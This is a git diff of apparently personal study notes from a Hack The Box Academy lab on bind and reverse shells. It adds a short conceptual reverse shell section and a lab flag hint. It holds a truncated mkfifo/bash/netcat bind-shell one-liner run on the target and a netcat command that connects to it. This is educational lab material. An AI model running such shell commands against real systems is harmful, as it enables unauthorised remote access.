@@ -4,7 +4,7 @@
 
 ### What is it?
 
-Bind shells are shells that we use to connect to a server
+Bind shells are us connecting to another machine (**Victim**)
 
 We are the attacker (**Client**) and the server is the one getting exploited (**Victim**)
 
@@ -93,16 +93,29 @@ target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | n
 
 And on our normal box (Attacker), we connect to the server with 
 
-````console
+```console
 client@attacker:~$ nc -nv 10.129.41.200 7777
+
 ```
 
 And now you should have a binding shell. 
 
 To find the flag for the task. Go to the root directory and move into the folder /customscripts with cd and cat the flag file.
 
+## Reverse Shell
+
+### WHat is it?
+
+Reverse shells are the victim connecting to our machine.
+
+With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
+
+![image](https://user-images.githubusercontent.com/83395536/223561378-f945d08b-8e4a-4bf8-bb92-39f652519890.png)
+
+Task solved ![image](https://user-images.githubusercontent.com/83395536/223561506-886d7c2c-f05b-4587-864c-559f220cd38b.png)
 
 
 
+<img src="https://academy.hackthebox.com/storage/modules/115/reverseshell.png" width="50%" height="50%">
 
 
